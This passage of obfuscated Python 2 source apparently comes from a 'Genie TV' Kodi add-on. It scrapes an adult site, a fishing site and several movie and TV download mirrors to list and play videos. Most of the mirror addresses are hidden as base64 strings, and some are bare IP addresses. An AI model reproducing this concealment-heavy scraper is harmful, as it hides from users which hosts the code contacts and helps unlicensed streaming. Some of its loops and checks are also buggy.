  iIi1IiI ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10105 , ii11iIi1I + 'Next.png' , '' , '' )
  if 76 - 76: ii11i1 * iIii1I11I1II1
def iiI1iI ( url ) :
 OoOO = ooOOO0 ( url )
 ii = re . compile ( '<div class="main-categories">(.+?)</div>' , re . DOTALL ) . findall ( OoOO )
 oOOoo = re . compile ( '<li><a class=".+?".+?href="(.+?)">Next</a></li>' ) . findall ( OoOO )
 for url in oOOoo :
  iIi1IiI ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10106 , ii11iIi1I + 'Next.png' , '' , '' )
 o0o = re . compile ( '<li><a href="(.+?)" class="btn btn-default">(.+?)</a>' ) . findall ( str ( ii ) )
 for url , OO in o0o :
  iIi1IiI ( OO , 'http://www.xvideos.com' + url , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
  if 84 - 84: OoooooooOO + O0o0Ooo / OOOo0 % iii11 % ii11ii1ii * OOOo0
  if 58 - 58: Ooo00oOo00o - I1IiI . i11iIiiIii % i11iIiiIii / i1IIi / OoIii111II
def Ii1ii1IiiiiiI ( ) :
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 ooIIIii11i1I = ( IIi1I1iiiii ) . replace ( ' ' , '+' ) . replace ( '&' , '&' )
 O0O0ooOOO = ooIIIii11i1I . lower ( )
 ooo0O00000oo0 = 'http://www.xvideos.com/?k=' + O0O0ooOOO
 print ooo0O00000oo0 + '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<'
 OoOO = ooOOO0 ( ooo0O00000oo0 )
 o0o = re . compile ( '<div class="thumb-inside"><script>.+?<img src="(.+?)".+?<a href="(.+?)" title=".+?">(.+?)</a></p>.+?uration">(.+?)</span>.+?Porn quality:(.+?)</span>' , re . DOTALL ) . findall ( OoOO )
 for o0O0o0 , iI1i11 , OO , OoOOoooOO0O , IIIi in o0o :
  Ii1iIiII1ii1 ( OO + ' - Porn Quality : ' + IIIi + ' - ' + OoOOoooOO0O , 'http://www.xvideos.com' + iI1i11 , 10108 , o0O0o0 , o0O0o0 , IIIi + ' - ' + OoOOoooOO0O )
 Ii1iiI1 = re . compile ( '<li><a href="([^"]*)" class="no-page">Next</a></li></ul></div>' ) . findall ( OoOO )
 for iI1i11 in Ii1iiI1 :
  iIi1IiI ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + iI1i11 , 10105 , ii11iIi1I + 'Next.png' , '' , '' )
  if 80 - 80: Oo + ii11ii1ii
def oOIii11111iiI ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( 'flv_url=(.+?)\;' ) . findall ( OoOO )
 for url in o0o :
  o0OOOOoO = ( url ) . replace ( '%3A' , ':' ) . replace ( '%2F' , '/' ) . replace ( '%3F' , '?' ) . replace ( '%3D' , '=' ) . replace ( '%26' , '&' ) . replace ( '&amp' , '' )
  OoO0Ooo ( o0OOOOoO )
  if 21 - 21: OOOo0 + ii11ii1ii * Oo * iIii1I11I1II1 - Ooo00oOo00o . Oo
def OoO0Ooo ( url ) :
 oo0 = xbmc . Player ( oOOO0oOoo ( ) )
 import urlresolver
 try : oo0 . play ( url )
 except : pass
 if 65 - 65: oo0OO . OoIii111II - ii11i1
 if 93 - 93: O0
def iii1o00000oo00 ( ) :
 OoOO = ooOOO0 ( i1111 ( 'aHR0cDovL3d3dy5nb2Zpc2hpbmcuY28udWsvQW5nbGluZy1UaW1lcy9TZWN0aW9uL1ZpZGVvcy8=' ) )
 o0o = re . compile ( 'class="item.+?"><a href="(.+?)">(.+?)</a></li>' ) . findall ( OoOO )
 for iI1i11 , OO in o0o :
  ooOO00oOOo000 ( '[COLORgreen]' + OO + '[/COLOR]' , ( 'http://www.gofishing.co.uk' + iI1i11 ) . replace ( 'http://www.gofishing.co.ukhttp://www.gofishing.co.uk' , 'http://www.gofishing.co.uk' ) , 8091 , ii11iIi1I + 'gofish.png' )
def iIII1iIi ( url ) :
 OoOO = o0o0 ( url )
 o0o = re . compile ( '<h2><a id=.+?href="([^"]*)">(.+?)</a></h2>' , re . DOTALL ) . findall ( OoOO )
 oo000 = re . compile ( '<h3><a href="([^"]*)" id=.+?>(.+?)</a> </h3>.+?<img src="([^"]*)"' , re . DOTALL ) . findall ( OoOO )
 next = re . compile ( 'href="([^"]*)">next</a>&gt;</li>' , re . DOTALL ) . findall ( OoOO )
 for url , OO in o0o :
  oOO0OO0OO ( '[COLORgreen]' + OO + '[/COLOR]' , 'http://www.gofishing.co.uk/' + url , 8092 , ii11iIi1I + 'gofish.png' )
 for url , OO , o0O0o0 in oo000 :
  oOO0OO0OO ( '[COLORgreen]' + OO + '[/COLOR]' , 'http://www.gofishing.co.uk/' + url , 8092 , 'http://www.gofishing.co.uk/' + o0O0o0 )
 for url in next :
  ooOO00oOOo000 ( '[COLORgreen]NEXT[/COLOR]' , url . replace ( ' ' , '+' ) , 8091 , ii11iIi1I + 'Next.png' )
def o000O0oo ( url ) :
 OoOO = o0o0 ( url )
 o0o = re . compile ( 'src="https://www.youtube.com/embed/(.+?)"' ) . findall ( OoOO )
 for url in o0o :
  yt . PlayVideo ( url )
  if 78 - 78: Ooo00oOo00o / Oo - iIii1I11I1II1 - i11iIiiIii * oo0OO
def o0O0Ooo ( url ) :
 O0o = urllib2 . Request ( url )
 O0o . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 O00oOOooO = ''
 oOooo0O0o = ''
 try :
  O00oOOooO = urllib2 . urlopen ( O0o )
  oOooo0O0o = O00oOOooO . read ( )
  O00oOOooO . close ( )
 except : pass
 if oOooo0O0o != '' :
  return oOooo0O0o
 else :
  oOooo0O0o = 'Failed'
  return oOooo0O0o
  if 46 - 46: iIii1I11I1II1 . i11iIiiIii - I1IiI % O0 / OoOoOO00 * i1IIi
  if 66 - 66: O0
def oOooOOo00ooO ( ) :
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 o0OO0oooo = ( i1111 ( 'aHR0cDovL2RsLnZpcG1heC1tb3ZpZS5pbi9Nb3ZpZS8=' ) )
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 O0O0ooOOO = IIi1I1iiiii . lower ( )
 iI1i11 = ( i1111 ( 'aHR0cDovL2RsNC5tb3ZpZWZhcnNpLmNvbS9maWxtLzIwMTUtNy8=' ) )
 Ooo0OOoOoO0 = ( i1111 ( 'aHR0cDovL2RsLmF2YWRsLmNvbS9OZXcvTW92aWUv' ) )
 IIo0Oo0oO0oOO00 = ( i1111 ( 'aHR0cDovLzIxNy4yMTkuMTQzLjEwOC8xMzI3Lw==' ) )
 if 40 - 40: O0o0Ooo - I1IiI * Ooo0OO0oOO - OoO0O0 / I1IiI
 OO0oo = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvbW92L2FsbC5waHA=' ) )
 O0oOO0o = ( i1111 ( 'aHR0cDovL2RsLnZpcG1heC1tb3ZpZS5pbi9Nb3ZpZS8=' ) )
 oo000oO0O = ( i1111 ( 'aHR0cDovL3d3dy5zbmFnZmlsbXMuY29tL3NlYXJjaC8/cT0=' ) ) + IIi1I1iiiii
 o0oiIi11I11 = ( i1111 ( 'aHR0cDovL3JlZGVtcHRpb25idWlsZC4xNm1iLmNvbS9SZWRlbXB0aW9uL21vdmllcy9hbGxtb3ZpZS5waHA=' ) )
 i1ioO = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9UaGVfUmVhcGVyL2FsbG1vdmllcy5waHA=' ) )
 I11iiI = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9oZXJvdmlzaW9uL3ZvZC9tb3ZmdWxsLnBocA==' ) )
 i1iIii1i111 = ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni9TY3JhcGVzL1NILnBocA==' ) )
 if 65 - 65: Oo * O0 / ii11i1 . O0o0Ooo % Oo
 Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Checking Sources" , '' , 'Please Wait' )
 OoOO = o0O0Ooo ( iI1i11 )
 Oo0oO0ooo . update ( 0 , "" , "Checking Source 1/9 Links" )
 iiIi11iI1iii = o0O0Ooo ( Ooo0OOoOoO0 )
 Oo0oO0ooo . update ( 14 , "" , "Checking Source 2/9 Links" )
 i1Ii1i1 = o0O0Ooo ( IIo0Oo0oO0oOO00 )
 Oo0oO0ooo . update ( 28 , "" , "Checking Source 3/9 Links" )
 if 80 - 80: OoooooooOO / iIii1I11I1II1 + ii11ii1ii / i1IIi / OOooOOo
 Oo0oO0ooo . update ( 40 , "" , "Checking Source 4/9 Links" )
 oOoO = o0O0Ooo ( OO0oo )
 Oo0oO0ooo . update ( 52 , "" , "Checking Source 5/9 Links" )
 ii1IIii = o0O0Ooo ( oo000oO0O )
 Oo0oO0ooo . update ( 64 , "" , "Checking Source 6/9 Links" )
 IiI11i1I11111 = o0O0Ooo ( o0oiIi11I11 )
 Oo0oO0ooo . update ( 76 , "" , "Checking Source 7/9 Links" )
 Ii1IIIIIIiI1 = o0O0Ooo ( i1ioO )
 Oo0oO0ooo . update ( 88 , "" , "Checking Source 8/9 Links" )
 Ii11IiIiiii1 = o0O0Ooo ( I11iiI )
 Oo0oO0ooo . update ( 100 , "" , "Checking Source 9/9 Links" )
 OooO0O0Ooo = o0O0Ooo ( i1iIii1i111 )
 if 85 - 85: OOooOOo / O0o0Ooo
 if 67 - 67: Ooo0OO0oOO % OoIii111II
 if OoOO != 'Failed' :
  o0o = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( OoOO )
  for ii1iiIi , OO in o0o :
   if IIi1I1iiiii in OO . lower ( ) :
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    oOO0OO0OO ( ( '[COLORgreen]' + OO + '- source 1[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( '.' , ' ' ) , ( iI1i11 + ii1iiIi ) , 222 , '' )
    Oo0oO0ooo . update ( 0 , "" , "Getting Source 1 Links" )
 if iiIi11iI1iii != 'Failed' :
  oo000 = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( iiIi11iI1iii )
  for ii1iiIi , OO in oo000 :
   if IIi1I1iiiii in OO . lower ( ) :
    oOO0OO0OO ( ( '[COLORgreen]' + OO + '- source 2[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( '.' , ' ' ) , ( Ooo0OOoOoO0 + ii1iiIi ) , 222 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 9 , "" , "Getting Source 2 Links" )
 if i1Ii1i1 != 'Failed' :
  Ooo0oO0 = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( i1Ii1i1 )
  for ii1iiIi , OO in Ooo0oO0 :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOO00oOOo000 ( ( '[COLORgreen]' + OO + '- source 3[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( '.' , ' ' ) , ( IIo0Oo0oO0oOO00 + ii1iiIi ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 18 , "" , "Getting Source 3 Links" )
    if 21 - 21: ii11ii1ii
    if 84 - 84: O0 / OOOo0 % i1IIi % i1IIi / Ooo00oOo00o / OoIii111II
    if 28 - 28: o0Oo0O0Oo00oO . OoooooooOO + OOooOOo + ii11i1 % oo0OO
    if 80 - 80: Oo
    if 86 - 86: ii11ii1ii * Ooo0OO0oOO . I1IiI / Oo + OoIii111II
    if 8 - 8: I1IiI
    if 16 - 16: OOooOOo . Ooo0OO0oOO
 if oOoO != 'Failed' :
  I1IIIIIi1IIiI = [ ]
  III11I11ii = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( oOoO )
  for iI1i11 , IIii1111 , o0OO0o0o00o , I11Ii1iI11iI1 , OO in III11I11ii :
   if IIi1I1iiiii in OO . lower ( ) :
    if OO in I1IIIIIi1IIiI :
     pass
    else :
     ooOooo000oOO ( ( '[COLORgreen]' + OO + '- source Scooby[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( 'Ganool' , '' ) . replace ( 'ShAaNiG' , '' ) . replace ( 'YIFY' , '' ) . replace ( '[[ Max-Movie.In ]]' , '' ) . replace ( '.mkv' , '' ) . replace ( '.mp4' , '' ) . replace ( '.' , ' ' ) , iI1i11 , 1016 , IIii1111 , I11Ii1iI11iI1 , o0OO0o0o00o )
     I1IIIIIi1IIiI . append ( OO )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 36 , "" , "Getting Scooby Links" )
     Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 if ii1IIii != 'Failed' :
  O0OoO0oO00 = re . compile ( 'href="(.+?)".+?src="(.+?)" alt="Image of (.+?)"' , re . DOTALL ) . findall ( ii1IIii )
  for iI1i11 , o0O0o0 , OO in O0OoO0oO00 :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOO00oOOo000 ( ( '[COLORgreen]' + OO + '- source Snag[/COLOR]' ) . replace ( '&#x27;' , '' ) , 'http://www.snagfilms.com' + iI1i11 , 7067 , o0O0o0 )
    Oo0oO0ooo . update ( 45 , "" , "Getting Snag Links" )
    if 2 - 2: O0o0Ooo - ii11ii1ii + OOooOOo * Ooo00oOo00o / oo0OO
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 if IiI11i1I11111 != 'Failed' :
  iIIiI11iI1Ii1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( IiI11i1I11111 )
  for iI1i11 , IIii1111 , o0OO0o0o00o , I11Ii1iI11iI1 , OO in iIIiI11iI1Ii1 :
   if IIi1I1iiiii in OO . lower ( ) :
    Ii1iIiII1ii1 ( ( '[COLORgreen]' + OO + '- source Redemption[/COLOR]' ) , iI1i11 , 222 , IIii1111 , I11Ii1iI11iI1 , o0OO0o0o00o )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 53 , "" , "Getting Redemption Links" )
    if 94 - 94: o0Oo0O0Oo00oO / i11iIiiIii % O0
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 if Ii1IIIIIIiI1 != 'Failed' :
  O0oO0oo0O = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( Ii1IIIIIIiI1 )
  for iI1i11 , IIii1111 , o0OO0o0o00o , I11Ii1iI11iI1 , OO in O0oO0oo0O :
   if IIi1I1iiiii in OO . lower ( ) :
    Ii1iIiII1ii1 ( ( '[COLORgreen]' + OO + '- source Reaper[/COLOR]' ) , iI1i11 , 222 , IIii1111 , I11Ii1iI11iI1 , o0OO0o0o00o )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 61 , "" , "Getting Reaper Links" )
    if 82 - 82: OoooooooOO . ii11i1
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 if Ii11IiIiiii1 != 'Failed' :
  III1iiiII1ii = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( Ii11IiIiiii1 )
  for iI1i11 , IIii1111 , o0OO0o0o00o , I11Ii1iI11iI1 , OO in III1iiiII1ii :
   if IIi1I1iiiii in OO . lower ( ) :
    Ii1iIiII1ii1 ( ( '[COLORgreen]' + OO + '- source Herovision[/COLOR]' ) , iI1i11 , 222 , IIii1111 , I11Ii1iI11iI1 , o0OO0o0o00o )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 70 , "" , "Getting Herovision Links" )
    if 76 - 76: ii11ii1ii
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
    if 99 - 99: OOooOOo
 if OooO0O0Ooo != 'Failed' :
  I11IIII1111II = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( OooO0O0Ooo )
  for iI1i11 , IIii1111 , OO in I11IIII1111II :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOO00oOOo000 ( ( '[COLORgreen]' + OO + '- source Silent Hunter[/COLOR]' ) , iI1i11 , 222 , IIii1111 )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 78 , "" , "Getting Silent Hunter Links" )
    if 6 - 6: iIii1I11I1II1 / iii11 + Ooo0OO0oOO
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 o0o00OOOO = [ '480p' , '720p' , '1080p' , 'mova' , 'movb' , 'movc' , 'movd' , 'move' , 'movf' , 'movg' , 'movh' , 'movi' , 'movj' , 'movk' , 'movl' , 'movm' , 'movn' , 'movo' , 'movp' , 'movq' , 'movr' , 'movs' , 'movt' , 'movu' , 'movv' , 'movw' , 'movx' , 'movy' , 'movz' ]
 if 42 - 42: o0Oo0O0Oo00oO * oo0OO
 for IiiiI in o0o00OOOO :
  iiIIi = IIiiiiiiIi1I1 + IiiiI + II11iiii1Ii
  i1iIIiI1111 = ooOOO0 ( iiIIi )
  if i1iIIiI1111 != 'Failed' :
   OooOO = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( i1iIIiI1111 )
   for iI1i11 , IIii1111 , o0OO0o0o00o , I11Ii1iI11iI1 , OO in OooOO :
    if IIi1I1iiiii in OO . lower ( ) :
     Ii1iIiII1ii1 ( '[COLORgreen]' + OO + ' - Source Pandoras[/COLOR]' , iI1i11 , 222 , IIii1111 , I11Ii1iI11iI1 , o0OO0o0o00o )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 89 , "" , "Getting Pandoras Links" )
     if 86 - 86: ii11i1 . iii11 / OoO0O0 - OoooooooOO
     Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
     if 45 - 45: iii11
 Oo0O0Oo00O = [ '0-9/' , 'A/' , 'B/' , 'C/' , 'D/' , 'E/' , 'F/' , 'G/' , 'H/' , 'I/' , 'J/' , 'K/' , 'L/' , 'M/' , 'N/' , 'O/' , 'P/' , 'R/' , 'S/' , 'T/' , 'U/' , 'V/' , 'W/' , 'X/' , 'Y/' , 'Z/' ]
 if 25 - 25: iii11 % O0
 if 44 - 44: O0o0Ooo . ii11i1 * OoOoOO00 / OoO0O0 + iIii1I11I1II1
 for IiiiI in Oo0O0Oo00O :
  iiIIi = o0OO0oooo + IiiiI
  Ii1111III1 = o0O0Ooo ( iiIIi )
  if oOoO != 'Failed' :
   oO00oooo0 = re . compile ( '<li><a href="(.+?)"> (.+?)</a></li>' ) . findall ( Ii1111III1 )
   for ii1iiIi , OO in oO00oooo0 :
    if IIi1I1iiiii in OO . lower ( ) :
     oOO0OO0OO ( ( '[COLORgreen]' + OO + 'source 5[/COLOR]' ) . replace ( 'Ganool' , '' ) . replace ( 'ShAaNiG' , '' ) . replace ( 'YIFY' , '' ) . replace ( '[[ Max-Movie.In ]]' , '' ) . replace ( '.mkv' , '' ) . replace ( '.mp4' , '' ) . replace ( '.' , ' ' ) , ( o0OO0oooo + IiiiI + ii1iiIi ) , 222 , '' )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 100 , "" , "Getting Source 5 Links" )
     if 94 - 94: Oo . o0Oo0O0Oo00oO * i11iIiiIii - OOooOOo . oo0OO
     Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
     if 98 - 98: iii11 + ii11i1
     if 52 - 52: Oo / I1IiI - O0o0Ooo . oo0OO
def iiI11Ii1i ( ) :
 if 100 - 100: oo0OO + Ooo0OO0oOO + o0Oo0O0Oo00oO + oo0OO / i1IIi
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 O0O0ooOOO = IIi1I1iiiii . lower ( )
 i1ioO = ( i1111 ( 'aHR0cDovL2Nvb2x0dnNlcmllcy5jb20vc2VhcmNoLnBocD90YWc9' ) ) + ( IIi1I1iiiii ) . replace ( ' ' , '+' )
 iI1i11 = ( i1111 ( 'aHR0cDovL2RsLmZhcnNpbW92aWUubmV0L1NlcmlhbC8=' ) )
 Ooo0OOoOoO0 = ( i1111 ( 'aHR0cDovL3N2Mi5kbC1wYXJzLmluLw==' ) )
 IIo0Oo0oO0oOO00 = ( i1111 ( 'aHR0cDovL3R2LmRsLXBhcnMuaW4v' ) )
 Oo0oOO0O00 = ( i1111 ( 'aHR0cDovL2RsLnZpcG1heC1tb3ZpZS5pbi9BbWVyaWNhbiUyMFNlcmlhbC8=' ) )
 OO0oo = ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29tL2Fyc2l2P2xpbWl0PSZ0dXI9Jm9yZGVyYnk9JnVsa2U9Jm9yZGVyPSZ5aWw9JmRpemlfYWRpPQ==' ) ) + ( IIi1I1iiiii ) . replace ( ' ' , '+' )
 O0oOO0o = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvc2hvd3MvdHZhbGwucGhw' ) )
 oo000oO0O = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9UaGVfUmVhcGVyL2FsbHR2LnBocA==' ) )
 o0oiIi11I11 = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9oZXJvdmlzaW9uL3ZvZC90dmZ1bGwucGhw' ) )
 if 55 - 55: o0Oo0O0Oo00oO % Oo % OOooOOo
 Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Checking Sources" , '' , 'Please Wait' )
 Ii1IIIIIIiI1 = o0O0Ooo ( i1ioO )
 Oo0oO0ooo . update ( 0 , "" , "Checking Source 1/9 Links" )
 OoOO = o0O0Ooo ( iI1i11 )
 Oo0oO0ooo . update ( 14 , "" , "Checking Source 2/9 Links" )
 iiIi11iI1iii = o0O0Ooo ( Ooo0OOoOoO0 )
 Oo0oO0ooo . update ( 28 , "" , "Checking Source 3/9 Links" )
 i1Ii1i1 = o0O0Ooo ( IIo0Oo0oO0oOO00 )
 Oo0oO0ooo . update ( 40 , "" , "Checking Source 4/9 Links" )
 I1Ii = o0O0Ooo ( Oo0oOO0O00 )
 Oo0oO0ooo . update ( 52 , "" , "Checking Source 5/9 Links" )
 oOoO = cloudflare . source ( OO0oo )
 Oo0oO0ooo . update ( 64 , "" , "Checking Source 6/9 Links" )
 Ii1111III1 = o0O0Ooo ( O0oOO0o )
 Oo0oO0ooo . update ( 76 , "" , "Checking Source 7/9 Links" )
 ii1IIii = o0O0Ooo ( oo000oO0O )
 Oo0oO0ooo . update ( 88 , "" , "Checking Source 8/9 Links" )
 IiI11i1I11111 = o0O0Ooo ( o0oiIi11I11 )
 Oo0oO0ooo . update ( 100 , "" , "Checking Source 9/9 Links" )
 if 76 - 76: oo0OO % I1IiI % iIii1I11I1II1 . iii11
 if IiI11i1I11111 != 'Failed' :
  iIIiI11iI1Ii1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( IiI11i1I11111 )
  for iI1i11 , IIii1111 , o0OO0o0o00o , I11Ii1iI11iI1 , OO in iIIiI11iI1Ii1 :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOooo000oOO ( ( '[COLORgreen]' + OO + '- source HeroVision[/COLOR]' ) , iI1i11 , 1016 , IIii1111 , I11Ii1iI11iI1 , o0OO0o0o00o )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 10 , "" , "Getting Herovision Links" )
    if 30 - 30: i1IIi
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
    if 75 - 75: Ooo0OO0oOO . iii11 - iIii1I11I1II1 * Ooo00oOo00o * oo0OO
 if ii1IIii != 'Failed' :
  O0OoO0oO00 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( ii1IIii )
  for iI1i11 , IIii1111 , o0OO0o0o00o , I11Ii1iI11iI1 , OO in O0OoO0oO00 :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOooo000oOO ( ( '[COLORgreen]' + OO + '- source Reaper[/COLOR]' ) , iI1i11 , 1016 , IIii1111 , I11Ii1iI11iI1 , o0OO0o0o00o )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 20 , "" , "Getting Reaper Links" )
    if 93 - 93: o0Oo0O0Oo00oO
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
    if 18 - 18: o0Oo0O0Oo00oO
 if Ii1IIIIIIiI1 != 'Failed' :
  O0oO0oo0O = re . compile ( 'href="([^"]*)"><img src="([^"]*)" alt="([^"]*)"' ) . findall ( Ii1IIIIIIiI1 )
  for iI1i11 , o0O0o0 , OO in O0oO0oo0O :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOO00oOOo000 ( '[COLORgreen]' + OO + ' CoolSeries[/COLOR]' , iI1i11 , 7052 , o0O0o0 )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 30 , "" , "Getting CoolSeries Links" )
    if 66 - 66: OoIii111II * i11iIiiIii + I1IiI / iii11
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 if OoOO != 'Failed' :
  o0o = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( OoOO )
  for OO in o0o :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOO00oOOo000 ( '[COLORgreen]' + ( OO ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) + ' source 1 [/COLOR]' , ( iI1i11 + OO ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 40 , "" , "Getting Source 1 Links" )
    if 96 - 96: iii11 + iii11 % OoO0O0 % iii11
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 if iiIi11iI1iii != 'Failed' :
  oo000 = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( iiIi11iI1iii )
  for OO in oo000 :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOO00oOOo000 ( ( OO + ' source 2' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( Ooo0OOoOoO0 + OO ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 50 , "" , "Getting Source 2 Links" )
    if 28 - 28: iIii1I11I1II1 + I1IiI . OOooOOo % i11iIiiIii
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 if i1Ii1i1 != 'Failed' :
  Ooo0oO0 = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( i1Ii1i1 )
  for OO in oo000 :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOO00oOOo000 ( ( OO + ' source 3' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( IIo0Oo0oO0oOO00 + OO ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 60 , "" , "Getting Source 3 Links" )
    if 58 - 58: Ooo0OO0oOO / OoooooooOO % OoIii111II + Ooo00oOo00o
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 if I1Ii != 'Failed' :
  o0ooOO0OOO00o = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( I1Ii )
  for OO in oo000 :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOO00oOOo000 ( ( OO + ' source 4' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( Oo0oOO0O00 + OO ) . replace ( ' ' , '%20' ) , 1006 , '' )
